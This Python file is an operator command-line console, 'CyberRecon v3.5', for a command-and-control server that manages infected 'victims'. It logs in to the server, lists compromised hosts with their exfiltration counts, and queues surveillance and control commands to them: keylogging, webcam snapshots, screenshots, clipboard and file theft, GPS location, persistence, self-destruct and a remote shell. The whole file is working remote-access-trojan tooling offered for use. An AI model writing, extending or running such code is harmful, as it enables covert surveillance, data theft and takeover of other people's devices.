"""
CyberRecon Operator CLI — v3.5
Command-line interface for controlling victims via C2 server.

v3.5 additions:
  - Password login to obtain session cookie (required by hardened server)
  - Session cookie sent on every request after login
  - Operator token sent in X-Operator-Token header (secondary auth)
  - Clear error messages on 401 / 503
"""

import argparse
import getpass
import os
import sys

import requests


class OperatorCLI:
    COMMANDS = [
        "whoami", "screenshot", "webcam_snap", "keylog_start", "keylog_stop",
        "clipboard_get", "download", "gps_locate", "process_list",
        "system_info", "persist", "self_destruct", "shell", "list_files"
    ]

    def __init__(self, c2_url, token=None, ca_bundle=None):
        self.c2_url = c2_url.rstrip("/")
        self.session = requests.Session()
        if token:
            self.session.headers.update({"X-Operator-Token": token})
        # TLS verification — default True (system CAs).
        # Set CYBERRECON_CA_BUNDLE to a PEM path for self-signed lab CA.
        self.session.verify = ca_bundle if ca_bundle else True
        self.current_victim = None
        self.logged_in = False

    def banner(self):
        print(r"""
   ____      _                  ____
  / ___|   _| |__   ___ _ __   |  _ \ ___  ___ ___  _ __
 | |  | | | | '_ \ / _ \ '__|  | |_) / _ \/ __/ _ \| '_ \
 | |__| |_| | |_) |  __/ |     |  _ <  __/ (_| (_) | | | |
  \____\__, |_.__/ \___|_|     |_| \_\___|\___\___/|_| |_|
        |___/

  Mandiant QR C2 Bypass - Operator Console (v3.5)
  """)

    def login(self, password=None):
        """Authenticate to the dashboard and store session cookie."""
        if not password:
            password = os.getenv("CYBERRECON_DASHBOARD_PASSWORD", "")
        if not password:
            password = getpass.getpass("[?] Dashboard password: ")

        try:
            resp = self.session.post(
                f"{self.c2_url}/login",
                data={"password": password},
                allow_redirects=False,
                timeout=10,
            )
            if resp.status_code in (301, 302):
                # Successful login → redirect to /dashboard
                self.logged_in = True
                print("[+] Logged in (session cookie acquired)")
                return True
            if resp.status_code == 401:
                print("[!] Login failed: invalid password")
                return False
            if resp.status_code == 503:
                print("[!] Server misconfigured: CYBERRECON_DASHBOARD_PASSWORD not set")
                return False
            print(f"[!] Unexpected login response: HTTP {resp.status_code}")
            return False
        except Exception as e:
            print(f"[!] Login error: {type(e).__name__}: {e}")
            return False

    def _handle_auth_error(self, resp):
        """Print a helpful message on 401/503."""
        if resp.status_code == 401:
            print("[!] 401 Unauthorized")
            if not self.logged_in:
                print("    → Not logged in. Restart the CLI and enter the dashboard password.")
            else:
                print("    → Session expired or missing X-Operator-Token.")
        elif resp.status_code == 503:
            print("[!] 503 Service Unavailable — server misconfigured (missing env var)")

    def list_victims(self):
        try:
            resp = self.session.get(f"{self.c2_url}/victims", timeout=10)
            if resp.status_code != 200:
                self._handle_auth_error(resp)
                return []
            data = resp.json()
            print(f"\n{'='*60}")
            print(f"  Active Victims: {data['count']}")
            print(f"{'='*60}")
            for v in data["victims"]:
                status_icon = "[ON]" if v["status"] == "online" else "[OFF]"
                print(f"\n  {status_icon} {v['id']} | {v['hostname']}")
                print(f"     IP: {v['ip']} | OS: {v['os']} | User: {v['user']}")
                print(f"     Pending: {v['pending_commands']} | Exfil: {v['exfil_count']}")
            print()
            return data["victims"]
        except Exception as e:
            print(f"[!] Error: {type(e).__name__}: {e}")
            return []

    def select_victim(self, victim_id):
        try:
            resp = self.session.get(f"{self.c2_url}/victim/{victim_id}", timeout=10)
            if resp.status_code == 200:
                self.current_victim = victim_id
                data = resp.json()
                print(f"[+] Selected victim: {data['hostname']} ({victim_id})")
                print(f"    OS: {data['os']} | User: {data['user']}")
                print(f"    Screenshots: {data['screenshots_count']} | Webcam: {data['webcam_count']}")
                print(f"    Keystrokes: {data['keystrokes_count']} | Locations: {data['locations_count']}")
                return True
            elif resp.status_code == 404:
                print(f"[!] Victim not found: {victim_id}")
                return False
            else:
                self._handle_auth_error(resp)
                return False
        except Exception as e:
            print(f"[!] Error: {type(e).__name__}: {e}")
            return False

    def send_command(self, command, args=None):
        if not self.current_victim:
            print("[!] No victim selected. Use 'select <victim_id>' first.")
            return
        payload = {"command": command}
        if args:
            payload["args"] = args
        try:
            resp = self.session.post(
                f"{self.c2_url}/command/{self.current_victim}",
                json=payload,
                timeout=10,
            )
            if resp.status_code == 200:
                data = resp.json()
                print(f"[+] Command queued: {command}")
                print(f"    Command ID: {data['command']['id']}")
                print(f"    Type: {data['command']['type']}")
            else:
                self._handle_auth_error(resp)
                try:
                    err = resp.json().get("error", "Unknown error")
                    print(f"[!] Failed: {err}")
                except Exception:
                    print(f"[!] Failed: HTTP {resp.status_code}")
        except Exception as e:
            print(f"[!] Error: {type(e).__name__}: {e}")

    def interactive(self):
        self.banner()

        # v3.5: log in first
        if not self.login():
            print("[!] Cannot continue without a valid session.")
            sys.exit(1)

        while True:
            try:
                prompt = f"cyberrecon({self.current_victim or 'none'})> "
                cmd_line = input(prompt).strip()
                if not cmd_line:
                    continue
                parts = cmd_line.split()
                cmd = parts[0].lower()
                args = parts[1:]

                if cmd in ["exit", "quit"]:
                    print("[+] Exiting...")
                    break
                elif cmd == "help":
                    print("""
  Commands:
    victims              List all active victims
    select <id>          Select a victim
    <command>            Send C2 command to selected victim
    info                 Show selected victim info
    help                 Show this help
    exit                 Exit console

  Available C2 Commands:
    whoami, screenshot, webcam_snap, keylog_start, keylog_stop,
    clipboard_get, download <path>, gps_locate, process_list,
    system_info, persist, self_destruct, shell, list_files
                    """)
                elif cmd == "victims":
                    self.list_victims()
                elif cmd == "select" and len(args) >= 1:
                    self.select_victim(args[0])
                elif cmd == "info":
                    if self.current_victim:
                        self.select_victim(self.current_victim)
                    else:
                        print("[!] No victim selected")
                elif cmd in self.COMMANDS:
                    self.send_command(cmd, args if args else None)
                else:
                    print(f"[!] Unknown command: {cmd}. Type 'help' for available commands.")
            except KeyboardInterrupt:
                print("\n[+] Exiting...")
                break
            except Exception as e:
                print(f"[!] Error: {type(e).__name__}: {e}")


def main():
    parser = argparse.ArgumentParser(description="CyberRecon Operator CLI (v3.5)")
    parser.add_argument("--c2", default="http://127.0.0.1:8443", help="C2 server URL")
    parser.add_argument(
        "--token",
        default=os.getenv("CYBERRECON_OPERATOR_TOKEN", ""),
        help="Operator API token (or set CYBERRECON_OPERATOR_TOKEN env var)",
    )
    parser.add_argument(
        "--ca-bundle",
        default=os.getenv("CYBERRECON_CA_BUNDLE", ""),
        help="Path to PEM CA bundle for TLS verification (default: system CAs)",
    )
    parser.add_argument(
        "--password",
        default=os.getenv("CYBERRECON_DASHBOARD_PASSWORD", ""),
        help="Dashboard password (or set CYBERRECON_DASHBOARD_PASSWORD env var; "
             "if omitted, the CLI prompts interactively)",
    )
    args = parser.parse_args()

    if not args.token:
        print("[!] WARNING: No operator token provided.")
        print("    Set --token <TOKEN> or CYBERRECON_OPERATOR_TOKEN env var.")
        print()

    if args.ca_bundle:
        if not os.path.isfile(args.ca_bundle):
            print(f"[!] ERROR: CA bundle not found: {args.ca_bundle}")
            sys.exit(1)
        print(f"[+] Using CA bundle: {args.ca_bundle}")
    else:
        print("[+] TLS verification: system CA store")

    cli = OperatorCLI(args.c2, args.token, args.ca_bundle or None)
    cli.interactive()


if __name__ == "__main__":
    main()